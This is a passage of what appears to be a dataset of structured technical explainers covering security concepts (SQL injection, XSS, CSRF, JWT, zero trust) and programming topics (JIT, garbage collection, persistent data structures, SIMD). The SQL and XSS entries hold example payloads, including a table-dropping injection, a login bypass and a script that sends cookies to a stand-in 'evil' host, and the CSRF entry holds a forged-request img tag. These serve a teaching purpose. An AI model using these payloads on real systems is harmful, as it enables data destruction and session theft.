    "how": "hash functions like SHA-256, BLAKE3, and Argon2 use compression functions that mix input bits chaotically. Encryption like AES-GCM uses a key to permute and XOR data with key-derived material in reversible ways. The distinguishing property: encryption has decryption, hashing does not",
    "why": "hashes verify integrity (file checksums, Merkle trees, commits in Git), index data, and store passwords (with salt and stretching). Encryption protects confidentiality. Confusing them is one of the most common security mistakes -- storing passwords with reversible encryption is a real-world breach pattern",
    "vs": "encryption is reversible; hashing is not. A hash is fixed size (32 bytes for SHA-256); ciphertext is roughly the size of the plaintext. Hashes have no key (or a key in the case of HMAC); encryption requires a key. Use hashing for verification, encryption for confidentiality",
    "ex": "Git commits are SHA-1 (transitioning to SHA-256) hashes of the commit content. The hash uniquely identifies the commit and forms a tamper-evident chain. By contrast, your encrypted backup uses AES-256-GCM so you can decrypt and read the original files later -- which a hash could never enable",
    "mis": "people 'encrypt' passwords, then are surprised when an attacker with the database recovers plaintext. Passwords should be hashed with a slow, salted KDF (Argon2, scrypt, bcrypt). Another myth is that base64 is encryption; it's just an encoding and provides zero security",
}
T["SQL injection"] = {
    "what": "a class of vulnerability where untrusted input is concatenated into a SQL query, allowing an attacker to alter the query's structure -- exfiltrating data, bypassing authentication, or corrupting the database. It has topped OWASP's vulnerability lists for two decades",
    "how": "an app builds a query like SELECT * FROM users WHERE name='$input'. If $input is anonymous'; DROP TABLE users; --, the query becomes two statements, dropping the table. Variants include UNION-based extraction, blind boolean injection, time-based injection, and second-order injection where the payload triggers on a later read",
    "why": "SQL injection enables full database compromise, including credential theft, data exfiltration, and remote code execution via xp_cmdshell or COPY ... PROGRAM. It has caused some of history's largest breaches (Heartland 2008, TalkTalk 2015, multiple government incidents). The fix is well known yet bugs persist",
    "vs": "compared with stored XSS (which targets users), SQL injection targets the data layer and is often more devastating. Compared with parameter pollution or prototype pollution, SQL injection is older but better understood and easier to prevent with parameterized queries",
    "ex": "a vulnerable PHP login: SELECT * FROM users WHERE name='$u' AND password='$p'. Submitting username admin'-- bypasses the password check entirely because the rest of the query becomes a comment. Parameterized queries (PDO with bindParam, Python's psycopg2 with %s placeholders) prevent this categorically",
    "mis": "people think modern ORMs make SQL injection impossible; raw queries, dynamic table names, and unsafe interpolation re-introduce it constantly. Another myth is that input validation is enough -- it isn't. Use parameterized queries; treat input filtering as defense in depth",
}
T["cross-site scripting (XSS)"] = {
    "what": "a vulnerability where attacker-controlled content is rendered as executable JavaScript in another user's browser. Stored XSS persists in the database and runs for every visitor; reflected XSS reflects from URL parameters; DOM XSS happens entirely client-side",
    "how": "the app outputs untrusted input into HTML without escaping. Submitting <script>fetch('//evil/?c='+document.cookie)</script> as a username and viewing the profile page runs the script in every visitor's browser, exfiltrating session cookies, modifying the DOM, or making same-origin API calls as the victim",
    "why": "XSS lets attackers act as authenticated users, steal sessions, deface sites, deliver malware, and exfiltrate data. It bypasses same-origin policy because the script is served from the legitimate origin. CSP, HTTPOnly cookies, and modern frameworks have reduced impact but bugs persist in edge cases",
    "vs": "compared with CSRF (which abuses the victim's session for state-changing requests), XSS is broader -- it can read responses and exfiltrate data, not just trigger actions. Compared with SQL injection, XSS targets users' browsers rather than the database",
    "ex": "a 2018 incident: British Airways' checkout page included a third-party script that was modified by an attacker. The script siphoned card details from the form to an attacker-controlled domain that mimicked a legitimate CDN. ~380,000 customer records were exfiltrated before detection",
    "mis": "people think escaping with htmlspecialchars is enough; context matters -- HTML, attribute, JavaScript, CSS, and URL contexts each need different escaping. Another myth is that XSS only matters if you handle sensitive data; even displaying ads via XSS-injected scripts can monetize stolen traffic",
}
T["cross-site request forgery (CSRF)"] = {
    "what": "an attack that tricks an authenticated user's browser into making an unintended state-changing request to a site where they're logged in. The attacker doesn't need the user's credentials -- the browser automatically includes session cookies",
    "how": "an attacker creates a page with a hidden form auto-submitting to bank.com/transfer with malicious parameters. When the victim, logged into bank.com, visits the attacker's page, the browser POSTs the form, including the bank.com session cookie, and the bank executes the transfer believing it came from the user",
    "why": "CSRF abused the implicit ambient authority of cookies. It enabled silent fund transfers, account takeovers via password-change requests, and admin-action hijacks. Modern defenses -- SameSite=Lax cookies (default in Chrome since 2020), CSRF tokens -- have largely closed the simple cases",
    "vs": "compared with XSS (which executes attacker-controlled JS in the victim's session), CSRF only triggers actions but cannot read responses. Compared with clickjacking, CSRF doesn't need user interaction -- a hidden form posts on page load. The two are complementary attacker techniques",
    "ex": "a forum that lets users delete posts via GET /delete?id=42 is trivially CSRF-vulnerable: an attacker embeds <img src='/delete?id=42'> in a comment, and any logged-in admin loading the comment deletes the post. Switching to POST helps; adding a CSRF token closes it",
    "mis": "people think SameSite cookies fully solve CSRF; they help but don't cover all flows (cross-site GET navigation, top-level form posts under SameSite=Lax). Another myth is that REST APIs are immune; if browsers send credentials and the API trusts cookies, REST endpoints are vulnerable too",
}
T["OAuth 2.0 flows"] = {
    "what": "OAuth 2.0 is an authorization framework that lets users grant third-party apps limited access to their data on a service without sharing passwords. It defines several grant flows -- authorization code, client credentials, device code, and (deprecated) implicit -- each suited to different client types",
    "how": "in the authorization code flow, the user is redirected to the authorization server, logs in, consents, and is redirected back with a short-lived code. The app exchanges that code (plus its client secret or PKCE proof) for an access token at the token endpoint. The token authorizes API calls within its scopes",
    "why": "OAuth removed the need for users to share passwords with third-party apps -- enabling 'sign in with Google', 'connect to Slack', and the entire app-integration ecosystem. It also enables principle-of-least-privilege via scopes that limit what the third party can access",
    "vs": "the authorization code flow with PKCE is the modern recommendation for nearly all clients (web, mobile, single-page apps). The implicit flow is deprecated due to token leakage in URLs. Client credentials handles machine-to-machine auth without a user. Device code handles input-constrained devices like TVs",
    "ex": "when a CI tool needs to push commits to your GitHub: GitHub redirects you to grant repo scope, you authorize, GitHub redirects back with a code, the CI tool exchanges it for a token, and the token authorizes git pushes -- without ever seeing your GitHub password",
    "mis": "people use OAuth for authentication; OAuth is for *authorization* (delegated API access). OpenID Connect is the layer on top that handles authentication. Another myth is that the access token is the user's identity -- it represents the app's authorization to access certain APIs, possibly on the user's behalf",
}
T["JWT tokens and their pitfalls"] = {
    "what": "JSON Web Tokens are a compact, URL-safe format for transmitting signed (and optionally encrypted) claims as a JSON object. They are widely used for session tokens, OAuth access tokens, and identity assertions in distributed systems",
    "how": "a JWT is three base64url-encoded parts separated by dots: header.payload.signature. The header declares the algorithm; the payload contains claims (sub, exp, iss, custom data); the signature is a HMAC or RSA/ECDSA signature over header and payload. Servers verify the signature without round-tripping a database",
    "why": "JWTs enable stateless authentication: the server validates the signature and trusts the embedded claims, no session lookup required. This scales well across microservices and serverless functions. They also support cross-service trust via shared signing keys or JWKS endpoints",
    "vs": "compared with opaque session tokens (a random ID looked up server-side), JWTs trade lookup cost for size and inflexibility. You cannot revoke a JWT before its expiry without a separate revocation list, and a leaked token is fully usable until expiry. Opaque sessions revoke instantly",
    "ex": "after login, a server signs a JWT with sub=user123, exp=tomorrow, role=admin. The client stores it and sends it in the Authorization: Bearer <token> header on every request. Each microservice independently verifies the signature with the shared public key and trusts the claims",
    "mis": "people think JWT signing means encryption; signing only protects integrity -- the payload is base64, readable by anyone. Use JWE for encryption. Another classic pitfall: trusting the alg header. Always pin the algorithm server-side; the 'alg: none' attack and confused-deputy bugs around alg switching have hit major services",
}
T["zero-trust architecture"] = {
    "what": "a security model where no actor (user, device, service) is trusted by default, regardless of network location. Every access request is authenticated, authorized, and encrypted, and trust is reassessed continuously based on signals like device posture, identity, and behavior",
    "how": "zero-trust replaces perimeter-based security (trust everything inside the firewall) with identity-based controls. Every request to an internal service requires proof of identity (mTLS, signed tokens), authorization based on policy (allow user X to access service Y from device Z), and continuous validation. Tools like BeyondCorp (Google), Okta, and Cloudflare Access implement this",
    "why": "the rise of remote work, SaaS apps, and supply-chain compromises has made the perimeter model obsolete. Major breaches (SolarWinds 2020, Colonial Pipeline 2021, MOVEit 2023) showed that one compromised credential or device on the inside could pivot to anything. Zero-trust limits blast radius",
    "vs": "compared with perimeter security (firewall + VPN), zero-trust grants access per-request rather than per-network. Compared with role-based access alone, zero-trust adds context (device health, location, recent behavior) to the decision. It is more flexible but more complex to implement",
    "ex": "Google's BeyondCorp eliminated VPNs internally. Engineers access internal apps from any network; each request goes through an access proxy that validates the device certificate, user authentication, and policy. A laptop missing a security patch loses access to sensitive systems automatically",
    "mis": "people think zero-trust is a product you buy; it is an architecture that takes years to retrofit. Another myth is that zero-trust eliminates VPNs immediately -- in practice, hybrid models persist for legacy systems that can't easily adopt per-request authentication",
}
T["defense in depth"] = {
    "what": "a security strategy that applies multiple independent layers of defense so a single failure doesn't lead to compromise. Borrowed from military doctrine, it assumes any control can fail and overlaps controls so attackers must defeat several to succeed",
    "how": "layers might include perimeter firewalls, network segmentation, host-based intrusion detection, application input validation, parameterized queries, output encoding, principle-of-least-privilege accounts, monitoring, and incident response. Each layer has its own threat model and failure modes",
    "why": "no single control is perfect. WAFs miss novel attacks; libraries have CVEs; humans misconfigure things. Layered defense raises attacker cost -- each additional control is another barrier -- and gives defenders time to detect and respond before damage is done",
    "vs": "compared with single-layer approaches (just a firewall, just input validation), defense in depth is more resilient but more expensive in operations and complexity. Compared with secure-by-design principles, defense in depth is reactive containment; both should coexist",
    "ex": "a SQL injection attempt encounters: a WAF that blocks obvious payloads, a parameterized-query ORM that prevents code/data confusion even if WAF fails, a database account with read-only access to a single table, monitoring that alerts on unusual queries, and backups that allow recovery if compromise occurs",
    "mis": "people add layers without considering interactions; redundant logging without analysis is noise, not defense. Another myth is that defense in depth means more is always better -- a sprawl of disconnected tools without integration creates gaps and alert fatigue worse than a coherent simpler stack",
}
T["the principle of least privilege"] = {
    "what": "a security principle stating that every user, process, and program should operate with the minimum privileges needed to do its job. Excess privilege expands the blast radius of any compromise -- a hijacked process can only do what its account can do",
    "how": "implementations include narrowly scoped IAM roles (AWS, GCP), per-service database users with minimal grants, sudoers rules limited to specific commands, container security policies, file permissions tightened to the minimum, and time-bound elevation for ad-hoc admin needs",
    "why": "least privilege limits the damage of credential theft, software vulnerabilities, and insider threats. Many catastrophic breaches involved credentials with broader access than needed -- a leaked AWS key with admin rights, a service account with write access to all S3 buckets",
    "vs": "compared with broad role-based access, least privilege is finer-grained and harder to administer, but the reduction in blast radius is dramatic. Compared with zero-trust, least privilege focuses on the *what* (permissions); zero-trust focuses on the *whether* (continuous validation of access)",
    "ex": "a Lambda function that reads from a single DynamoDB table and writes to one S3 bucket should have an IAM role with exactly those two permissions, scoped to those exact resources -- not '*' on dynamodb and s3. If the function is compromised, the attacker can only touch those two resources",
    "mis": "people think least privilege means painful access requests for everything; modern IAM tools allow time-bound elevation, just-in-time access, and policy generation from observed behavior. Another myth is that least privilege only matters for production -- developer environments are common pivot points for attackers",
}
T["rate limiting and DDoS mitigation"] = {
    "what": "rate limiting caps how many requests a client (by IP, user, or API key) can make in a time window. DDoS mitigation defends against massive distributed traffic floods designed to overwhelm a service. They are related but operate at different scales",
    "how": "rate limiting commonly uses token bucket (allow N requests, refill over time) or sliding window counters in Redis or in-memory. DDoS mitigation operates at the network edge with traffic scrubbing, BGP blackholing, and Anycast capacity that absorbs attacks via geographic distribution. Cloudflare, Akamai, and AWS Shield are typical providers",
    "why": "rate limiting protects against scrapers, brute-force attacks, accidental floods from buggy clients, and noisy neighbors. DDoS mitigation prevents extortion and outages -- attacks now exceed terabits per second and can take any unprotected service offline within minutes",
    "vs": "rate limiting is application-aware (per user, per endpoint) and runs near the app. DDoS mitigation is network-level and runs at the edge of the internet, often at scrubbing centers. Both are essential and complementary -- one stops abuse from valid clients, the other absorbs raw bandwidth attacks",
    "ex": "GitHub's API rate limits authenticated users to 5000 requests per hour. Exceeding it returns 429 with a Retry-After header. Separately, GitHub's edge absorbed a 1.35 Tbps DDoS in 2018 (the largest at the time) via Akamai's network -- different defenses for different threat models",
    "mis": "people think rate limiting prevents DDoS; it can shed load on a single host but a real DDoS overwhelms the network before requests reach your rate limiter. Another myth is that DDoS attacks require sophisticated tooling -- booter services rent botnet capacity for a few dollars per attack",
}
T["WebAssembly"] = {
    "what": "a portable binary instruction format for a stack-based virtual machine, designed to run sandboxed code at near-native speed in browsers and other hosts. Wasm modules can be compiled from C, C++, Rust, Go, and many other languages",
    "how": "source compiles to .wasm bytecode that the runtime validates and either JIT-compiles or AOT-compiles to native code. Wasm has a strict structural type system and a sandboxed memory model. The host (browser, server runtime) provides imports for IO; the module imports them like a normal library",
    "why": "Wasm brings serious computation to the browser without plugins -- video editing, CAD, ML inference, games. Outside the browser, Wasm runtimes (wasmtime, wasmer) enable secure plugin systems, edge functions (Cloudflare Workers, Fastly), and language-agnostic deployment. WASI standardizes system calls",
    "vs": "compared with JavaScript, Wasm runs ~10-100x faster on numeric code. Compared with native binaries, Wasm is portable across architectures and OS, and runs inside a sandbox by default. Compared with containers, Wasm starts in microseconds and can isolate at function granularity",
    "ex": "Figma's renderer compiles a C++ codebase to Wasm; Photoshop on the Web runs the same C++ engine as desktop Photoshop, in browser. Cloudflare Workers and Fastly Compute@Edge let you ship Rust- or AssemblyScript-compiled Wasm to run at edge locations with cold starts under a millisecond",
    "mis": "people think Wasm replaces JavaScript; it complements JS for compute-heavy modules while JS handles DOM and UI. Another myth is that Wasm is browser-only -- server-side Wasm runtimes are an active area precisely because of the sandbox and portability story",
}
T["GraphQL vs REST"] = {
    "what": "two API paradigms. REST exposes resources at URLs with HTTP verbs and returns server-defined response shapes. GraphQL exposes a single endpoint accepting a query language where the client specifies exactly which fields it wants, and the server returns matching JSON",
    "how": "REST endpoints like /users/42 return a fixed shape, possibly with related data via separate endpoints or includes. GraphQL endpoints accept queries like { user(id: 42) { name, posts { title } } } and return only those fields, joining across underlying data sources via resolvers",
    "why": "GraphQL eliminates over- and under-fetching, lets frontend teams iterate without backend coordination, and produces self-documenting schemas. REST is simpler, leverages HTTP caching naturally, and has wider tooling. The choice often hinges on team structure and client diversity",
    "vs": "REST is simpler and benefits from HTTP semantics -- caching, status codes, idempotency. GraphQL is more flexible but pushes complexity onto resolvers and the query parser. Solving the N+1 query problem in GraphQL requires DataLoader-style batching; REST sidesteps it by designing endpoints around use cases",
    "ex": "a mobile app fetching a user profile with their last 5 posts and friend count: REST might require three round trips (/users/42, /users/42/posts?limit=5, /users/42/friends/count). GraphQL fetches all three in one request, returning exactly the fields used -- saving bandwidth and latency on cellular",
    "mis": "people think GraphQL is always faster; it can be slower if resolvers do N+1 queries or return large unfiltered datasets. Another myth is that GraphQL replaces REST; many production stacks use both -- GraphQL for client-facing flexibility, REST for service-to-service or webhook callbacks",
}
T["server-sent events"] = {
    "what": "an HTTP-based protocol for one-way streaming from server to client. The server sends a long-lived response with content-type text/event-stream containing newline-delimited messages; the browser's EventSource API parses them into events",
    "how": "the client opens a normal GET request to an SSE endpoint; the server responds with HTTP 200 and never closes the body, instead writing 'data: ...' lines for each event. The browser exposes onmessage handlers, automatically reconnects on disconnect, and resumes from the last seen event ID via the Last-Event-ID header",
    "why": "SSE is the simplest server-push primitive, perfect for streaming notifications, live counters, log tailing, and dashboards. It works through standard HTTP infrastructure (proxies, CDNs), supports automatic reconnection, and is dramatically easier to implement than WebSockets for one-way use cases",
    "vs": "compared with WebSockets, SSE is one-way (server to client) and text-only, but uses normal HTTP and reconnects automatically. Compared with long polling, SSE is more efficient (one connection, many events). Compared with HTTP/2 server push, SSE is widely supported and not deprecated",
    "ex": "ChatGPT-style streaming responses use SSE. The server receives a prompt, opens an SSE response, and writes incremental tokens as they're generated. The browser displays them as they arrive, creating the typewriter effect. When the response is complete, the server sends a sentinel and closes",
    "mis": "people think SSE is browser-only; any HTTP client can consume it -- it's just a text stream. Another myth is that SSE is limited to 6 connections per origin; that was an HTTP/1 issue and HTTP/2 multiplexes streams without the limit",
}
T["service workers"] = {
    "what": "JavaScript files registered by a web page that run in the background, separate from the page, and can intercept network requests. They enable offline-first apps, push notifications, background sync, and custom caching strategies",
    "how": "after registration, a service worker installs and activates. It listens for fetch events; for each, it can return a cached response, fetch from the network, or synthesize a response. It also handles push events (notifications when the page is closed) and sync events (deferred work when connectivity returns)",
    "why": "service workers turn the web into a platform that competes with native apps for offline capability. They power Progressive Web Apps -- installable, offline-capable, push-enabled web apps. Twitter Lite, Pinterest, and many news sites use them to feel like native apps with a fraction of the install friction",
    "vs": "compared with the older Application Cache (deprecated), service workers give programmatic control over caching with sane updates. Compared with native app push, service worker push works without an app store and runs the same code across platforms, though iOS support lagged for years",
    "ex": "a news site's service worker caches articles on view. On the next visit without connectivity, the service worker serves cached articles instead of an error page. Push notifications about breaking news arrive even when no tab is open; tapping one opens or focuses the relevant article",
    "mis": "people think service workers run continuously; they are short-lived background scripts the browser starts on demand. Another myth is that service workers solve all offline problems -- they're a building block, but app state, conflict resolution, and sync semantics still require careful design",
}
T["browser rendering pipeline"] = {
    "what": "the sequence of steps a browser performs to turn HTML, CSS, and JavaScript into pixels on screen: parse, style, layout, paint, composite. Understanding it is essential for diagnosing performance issues like jank, layout thrash, and slow paint",
    "how": "the parser builds a DOM from HTML and CSSOM from CSS. The render tree combines them. Layout (or 'reflow') computes geometry. Paint generates draw commands per layer. Compositing assembles layers on the GPU and presents the frame, ideally within 16.7ms for 60fps",
    "why": "knowing the pipeline lets developers avoid expensive operations -- e.g., changing layout-affecting properties (width, top) inside a scroll handler triggers reflows that miss frames. Animating transform and opacity, which only require compositing, stays smooth even on slow devices",
    "vs": "compared with a render thread on a game engine, browsers must handle arbitrary documents with reflow and dynamic restyling. Compared with native UI frameworks, browsers expose less direct control over the GPU but increasingly converge with APIs like WebGPU and view transitions",
    "ex": "a list with 10,000 items is slow to render because layout computes geometry for every item. Virtualizing the list (rendering only visible rows + overscan) makes layout O(visible) instead of O(total) and the scroll feels native. The DOM grows by maybe 30 nodes instead of 10,000",
    "mis": "people think requestAnimationFrame guarantees 60fps; it just runs before the next paint. If your callback exceeds the frame budget, you drop frames. Another myth is that JavaScript is the only bottleneck -- layout and paint can be just as expensive on complex pages with many DOM nodes",
}
T["JIT compilation"] = {
    "what": "Just-In-Time compilation translates code into machine code at runtime, often based on observed types and execution frequencies. JIT-based runtimes -- HotSpot JVM, V8, .NET CLR, LuaJIT, PyPy -- can outperform AOT for dynamically typed languages because they specialize on actual usage",
    "how": "the JIT starts by interpreting bytecode while collecting profiling data (which methods are hot, which types are seen, which branches taken). When a method warms up, the JIT compiles it with optimizations -- inlining, escape analysis, deoptimization guards -- producing native code that runs much faster than the interpreter",
    "why": "JIT enables high performance for languages whose types aren't known statically (JavaScript, Python via PyPy, Lua). Without JIT, dynamic languages would be 10-100x slower. V8's optimizations are why modern web apps approach native performance for compute-heavy code",
    "vs": "compared with AOT (ahead-of-time) compilation, JIT can specialize on runtime profile (types, branch frequencies) and reoptimize when assumptions break. The cost is warmup time and memory for the JIT itself. For short-lived processes (CLI tools, serverless), AOT often wins; for long-running services, JIT wins",
    "ex": "V8 starts by interpreting JavaScript with Ignition. Hot functions are compiled by TurboFan with type-specialized code -- if a function always sees integers, V8 emits integer arithmetic. If a string later flows in, V8 deoptimizes back to the interpreter and may recompile with a less-specialized version",
    "mis": "people think JITed code is always slower than AOT; on long-running JavaScript or Java workloads, JIT often beats AOT C++ on micro-benchmarks because of profile-guided inlining. Another myth is that JIT compiles everything -- only hot code is compiled to keep startup fast and memory bounded",
}
T["ahead-of-time compilation"] = {
    "what": "compiling code to native machine instructions before deployment, producing a binary that runs without a compiler at runtime. Languages like C, C++, Rust, Go, and Swift are AOT-compiled; .NET and JVM offer optional AOT (ReadyToRun, GraalVM Native Image) to reduce startup",
    "how": "the compiler analyzes the entire program, applies optimizations (inlining, dead code elimination, vectorization), and emits native code for a target architecture. Linkers combine object files and libraries into the final executable. The runtime cost is zero compilation -- the program starts immediately at full speed",
    "why": "AOT eliminates startup overhead and provides predictable performance, both important for CLI tools, serverless functions, mobile apps, and embedded systems. It also makes binaries easier to ship and audit because the deployable artifact is exactly what runs",
    "vs": "compared with JIT, AOT lacks runtime profile information so it can't specialize on actual usage. Modern AOT systems use profile-guided optimization (PGO) to recover some of this. JIT wins on long-running dynamic-language workloads; AOT wins on startup latency and predictability",
    "ex": "GraalVM Native Image compiles a Spring Boot Java app to a self-contained native binary that starts in tens of milliseconds (vs seconds for JVM warmup). This makes Java viable for serverless functions and CLI tools where JVM startup was previously prohibitive",
    "mis": "people think AOT means no runtime at all; most AOT'd languages still ship a runtime (allocator, GC, stdlib) -- it just doesn't compile code at runtime. Another myth is that AOT binaries are universally faster than JIT -- on workloads where types and call patterns are unpredictable, JIT specialization can win",
}
T["just-in-time vs ahead-of-time tradeoffs"] = {
    "what": "the choice between compiling code at runtime (JIT) or before deployment (AOT). Each affects startup time, peak performance, memory footprint, deployability, and how well the runtime can adapt to actual workload patterns",
    "how": "JIT compilers profile execution and recompile hot paths with type and branch specialization. AOT compilers run once during build and emit fixed native code. Hybrid approaches -- AOT compile common paths, JIT specialize hot ones -- exist in .NET ReadyToRun and Android's profile-guided AOT",
    "why": "the right choice depends on the workload. Long-running servers benefit from JIT's runtime adaptability; short CLI commands and serverless functions benefit from AOT's instant startup. Mobile apps trade install size against startup latency, often using a mix",
    "vs": "JIT: better peak performance on dynamic workloads, slow startup, more memory. AOT: instant startup, predictable performance, smaller runtime, but less adaptable. PGO narrows the gap by feeding profiling data into AOT compilation",
    "ex": "a Lambda function written in Java cold-starts in 800ms with the JVM but in 80ms when compiled with GraalVM Native Image. The native image misses some peak throughput, but for a function that runs for 200ms per invocation, total user-perceived latency drops dramatically",
    "mis": "people frame it as JIT vs AOT being mutually exclusive; modern systems mix them (JVM with C2 + tiered compilation, .NET CoreCLR with ReadyToRun). The real choice is which optimization stages happen at build time vs at runtime",
}
T["garbage collector tuning"] = {
    "what": "the practice of adjusting GC parameters -- heap sizes, generation ratios, pause-time targets, collection algorithm -- to match an application's allocation pattern and latency requirements. Default settings are general-purpose; tuning can dramatically improve tail latency and throughput",
    "how": "tuning starts with measurement: GC logs, heap dumps, allocation profilers. You identify whether the app is throughput-bound (pause time matters less) or latency-sensitive (pauses kill SLOs). Then you choose an algorithm (G1, ZGC, Shenandoah on JVM; Go's concurrent collector) and adjust heap size, region size, soft pause goals, and concurrent thread counts",
    "why": "production services often spend 5-30% of CPU on GC and suffer pause-time-related tail latency spikes. Effective tuning can cut p99 latency by 10x and throughput by 20-50%. For latency-sensitive systems (trading, ad bidding, gaming), it's the difference between meeting and missing SLOs",
    "vs": "throughput collectors (parallel GC) maximize total work done at the cost of long stop-the-world pauses. Low-pause collectors (G1, ZGC, Shenandoah) trade some throughput for sub-millisecond pauses on multi-GB heaps. The right choice depends on whether your SLO is throughput or tail latency",
    "ex": "a Java service with 10ms p99 latency target and frequent GC pauses of 200ms switches from G1 to ZGC, sets max heap 32GB, and configures concurrent thread count. P99 drops below 5ms because ZGC keeps pauses under 1ms even on a multi-GB heap. Throughput drops ~10%, an acceptable trade",
    "mis": "people increase heap size to 'fix' GC issues; oversized heaps lead to longer pauses on full GC and mask underlying allocation problems. Another myth is that G1 is always better than CMS or Parallel; for batch jobs that don't care about pauses, Parallel still has the highest throughput",
}
T["reactive programming"] = {
    "what": "a programming paradigm built around asynchronous data streams and the propagation of change. Events, state changes, and data flow through observable streams that consumers can subscribe to and transform with operators (map, filter, merge, debounce)",
    "how": "the core abstraction is the Observable (or Stream). Producers emit events; operators transform the stream functionally (map, filter); subscribers react to emissions. Libraries include RxJS, Reactor (Java), Combine (Swift). Pull-based variants like Iterators differ from push-based Observables",
    "why": "reactive programming naturally handles UI events, network responses, and real-time data without callback hell or imperative state mutation. It composes well -- you can debounce a search input, then map to an HTTP request, then merge results from multiple sources, all declaratively",
    "vs": "compared with imperative event handling, reactive code is declarative and composable. Compared with promises (single-value async), Observables are multi-value streams. Compared with raw event emitters, reactive streams come with rich operators and standardized error/completion semantics",
    "ex": "a search box: const results = fromEvent(input, 'input').pipe(map(e => e.target.value), debounceTime(300), switchMap(query => http.get('/search?q=' + query))). This handles typing, debouncing, and request cancellation in five lines of declarative code",
    "mis": "people think reactive is only for UI; it's equally useful for backend stream processing, microservice composition, and real-time analytics. Another myth is that reactive eliminates concurrency bugs; it tames many but introduces new ones around backpressure and lifecycle",
}
T["functional reactive programming"] = {
    "what": "a paradigm combining functional programming with reactive streams. FRP models time-varying values (Behaviors) and event streams (Events), and lets you compose them with pure functions. Conal Elliott's original FRP (1997) was for animation; modern variants drive UI frameworks like Elm",
    "how": "values change over time as Behaviors (continuous) or Events (discrete). Pure functions transform them, and the runtime efficiently propagates changes through the graph. Libraries like Reflex, Elm's signals, and (loosely) Vue's reactivity system implement FRP-inspired models",
    "why": "FRP cleanly separates 'what' from 'when'. UI logic becomes a pure function from state to view, and the runtime handles event handling, scheduling, and incremental update. This makes complex interactive systems easier to reason about and test",
    "vs": "FRP is stricter than RxJS-style reactive programming -- it emphasizes pure functions and well-defined semantics for time. Compared with imperative state machines, FRP eliminates side-effect interleaving bugs by routing all changes through declarative graphs",
    "ex": "Elm's TEA (The Elm Architecture) is FRP-inspired: state -> view, events -> update -> new state. Signals/Subscriptions handle external events as pure values flowing through the system. The compiler ensures no runtime exceptions and impossible states are unrepresentable",
    "mis": "people conflate FRP with general reactive libraries; classic FRP has stricter purity guarantees. Another myth is that FRP is academic; Elm and Cycle.js show practical FRP shipping production apps, and modern UI frameworks have absorbed many of its ideas",
}
T["immutable data structures"] = {
    "what": "data structures that cannot be modified after creation. Operations that look like mutations return new instances sharing structure with the original via persistent data structure techniques. Common in functional languages and increasingly mainstream via Immer, Immutable.js, and Clojure's collections",
    "how": "instead of in-place updates, operations create new versions sharing internal structure. A persistent vector backed by a 32-way trie can update one element by allocating only log32(n) new nodes and reusing the rest. The result: O(log n) updates with structural sharing rather than O(n) full copies",
    "why": "immutability eliminates entire classes of bugs (concurrent modification, action-at-a-distance, accidental aliasing). It enables cheap snapshots, time-travel debugging, undo/redo, and safe concurrent reads without locks. Redux's state model and React's reconciliation depend on immutability for fast equality checks",
    "vs": "compared with mutable structures, immutable ones use more memory and are slower per operation, but enable structural sharing and equality-by-reference. Languages like Clojure default to immutable; libraries like Immer make immutability ergonomic in JavaScript without rewriting code",
    "ex": "a Redux app keeps state in an immutable tree. Dispatching an action returns a new tree with a few changed nodes; the rest is shared with the previous tree. React diff'ing checks reference equality on subtrees that didn't change, skipping rerenders for vast portions of the UI in O(1)",
    "mis": "people think immutability means O(n) copies; persistent data structures give O(log n) updates with sharing. Another myth is that immutability slows things down -- in many real apps, the structural sharing plus avoided defensive copies actually speeds things up",
}
T["persistent data structures"] = {
    "what": "data structures that preserve previous versions when modified, so all historical versions remain accessible. Implementations use structural sharing -- the new version reuses parts of the old version's internal representation rather than copying everything",
    "how": "a persistent vector might be a balanced 32-way trie. Updating index i creates a new path from root to leaf (log32(n) new nodes) while every other branch is shared by reference with the old vector. Persistent hash maps (HAMT) and persistent trees use similar techniques",
    "why": "they enable undo/redo trivially, make concurrent reads safe without locks, support time-travel debugging, and let you keep a history of states cheaply. Clojure's collections, Scala's immutable.HashMap, and ImmutableJS implement persistent structures used in production",
    "vs": "compared with copy-on-write that copies the whole structure on first write, persistent structures share at internal node granularity, achieving O(log n) updates instead of O(n). Compared with mutable structures, they trade slightly slower updates for safe concurrent reads and snapshot semantics",
    "ex": "Git's object model is persistent: every commit references a tree, every tree references blobs and subtrees, all by content hash. Branching is creating a new pointer; nothing is copied. The same pattern underlies persistent collections in functional languages",
    "mis": "people confuse 'persistent' with on-disk persistence; here it means 'previous versions persist in memory'. Another myth is that they're prohibitively slow; in practice they're a constant factor slower than mutable structures and often faster than defensive copying",
}
T["copy-on-write"] = {
    "what": "an optimization technique where data is shared between contexts until one of them attempts to write, at which point the shared copy is duplicated. Common in OS kernels (fork), file systems (ZFS, APFS), and language runtimes (Swift's strings and arrays)",
    "how": "two consumers share a single buffer with a reference count or a copy-on-write flag. Reads work directly on the shared buffer at zero cost. The first write allocates a private copy and updates the writer's reference; the other consumer keeps the original",
    "why": "COW makes operations like fork(), filesystem snapshots, and string passing cheap until they're actually mutated. fork() on Linux duplicates memory mappings instantaneously; physical pages copy only when one side writes. This makes process spawning fast and memory-efficient",
    "vs": "compared with eager copying, COW saves memory and time when most data isn't modified. Compared with full immutability, COW retains in-place mutation for the writer but isolates from the reader. The downside is pause spikes when a write triggers a large copy",
    "ex": "Linux fork() shares all memory pages between parent and child. A child that immediately exec()'s a different program never copies; a child that writes to its stack copies just that page. The result: process spawning is O(memory mapping table), not O(memory)",
    "mis": "people think COW makes writes free; the first write to each shared page is more expensive than a normal write because it triggers allocation. Another myth is that COW always saves memory -- in write-heavy workloads, the copies happen quickly and you pay overhead with no benefit",
}
T["SIMD vectorization"] = {
    "what": "Single Instruction, Multiple Data: CPU instructions that perform the same operation on multiple data elements in parallel within a single register. SSE, AVX, AVX-512, NEON, and SVE are SIMD instruction sets on x86 and ARM",
    "how": "wide registers (128-bit SSE, 256-bit AVX, 512-bit AVX-512) hold multiple values; one instruction adds, multiplies, or compares all of them in parallel. Compilers auto-vectorize simple loops; intrinsics like _mm256_add_ps give explicit control. ML inference, image processing, and crypto rely heavily on SIMD",
    "why": "SIMD multiplies single-core throughput by 4x, 8x, or 16x for parallelizable workloads. Modern matrix math, video decoding, JSON parsing (simdjson), and AI inference owe their performance largely to SIMD. Without it, the same workload would need that many more cores or that much more time",
    "vs": "compared with scalar code, SIMD trades some flexibility for huge throughput. Compared with GPU compute, SIMD on CPU has lower latency and no PCIe transfer cost but smaller width. Compared with multi-threading, SIMD parallelizes within a thread; the two compose multiplicatively",
    "ex": "simdjson parses JSON at gigabytes per second by using AVX2 to process 32 bytes at a time -- finding quotes, escapes, and structural characters with bitwise operations on packed registers. Naive byte-by-byte parsers are 10x slower",
